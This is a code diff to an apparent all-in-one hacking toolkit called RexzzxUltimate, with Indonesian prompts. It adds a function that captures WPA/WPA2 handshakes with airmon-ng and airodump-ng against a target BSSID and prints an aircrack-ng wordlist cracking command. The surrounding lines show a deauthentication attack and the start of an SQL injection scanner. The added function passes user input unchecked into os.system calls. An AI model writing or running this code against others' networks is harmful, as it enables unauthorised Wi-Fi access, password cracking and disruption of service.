@@ -87,6 +87,48 @@ class RexzzxUltimate:
         os.system("airmon-ng start wlan0")
         os.system("aireplay-ng --deauth 100 -a [BSSID] wlan0mon")
     
+    def capture_handshake(self):
+        """Capture WPA/WPA2 handshake for offline cracking"""
+        print(colored("\n[+] WPA Handshake Capture Tool", "green"))
+        print(colored("[!] Pastikan Anda memiliki aircrack-ng terinstall", "yellow"))
+        
+        if not self.check_tool_installed("airodump-ng"):
+            print(colored("[-] aircrack-ng tidak terinstall!", "red"))
+            print(colored("[+] Install dengan: pkg install aircrack-ng -y", "green"))
+            return
+        
+        interface = input(colored("[?] Masukkan interface WiFi (default wlan0): ", "blue")) or "wlan0"
+        bssid = input(colored("[?] Masukkan BSSID target: ", "blue"))
+        channel = input(colored("[?] Masukkan channel WiFi: ", "blue"))
+        output_file = input(colored("[?] Nama file output (tanpa ekstensi): ", "blue")) or "handshake"
+        
+        try:
+            # Put interface in monitor mode
+            print(colored("\n[+] Mengaktifkan mode monitor...", "yellow"))
+            os.system(f"airmon-ng start {interface}")
+            
+            # Start capturing handshake
+            print(colored("[+] Memulai capture handshake...", "green"))
+            print(colored("[!] Tekan Ctrl+C ketika melihat 'WPA handshake'", "yellow"))
+            os.system(f"airodump-ng -c {channel} --bssid {bssid} -w {output_file} {interface}mon")
+            
+            print(colored(f"\n[+] Handshake tersimpan di {output_file}.cap", "green"))
+            print(colored("[+] Crack dengan: aircrack-ng -w wordlist.txt {output_file}.cap", "yellow"))
+            
+        except KeyboardInterrupt:
+            print(colored("\n[!] Dihentikan oleh pengguna", "red"))
+        finally:
+            # Return interface to managed mode
+            os.system(f"airmon-ng stop {interface}mon")
+    
+    def check_tool_installed(self, tool_name):
+        """Check if a tool is installed"""
+        try:
+            subprocess.check_output(["which", tool_name])
+            return True
+        except subprocess.CalledProcessError:
+            return False
+
     # [2] IMPLEMENTASI WEB EXPLOIT
     def sql_injection_scan(self):
         target = input(colored("\n[?] Masukkan URL target: ", "blue"))
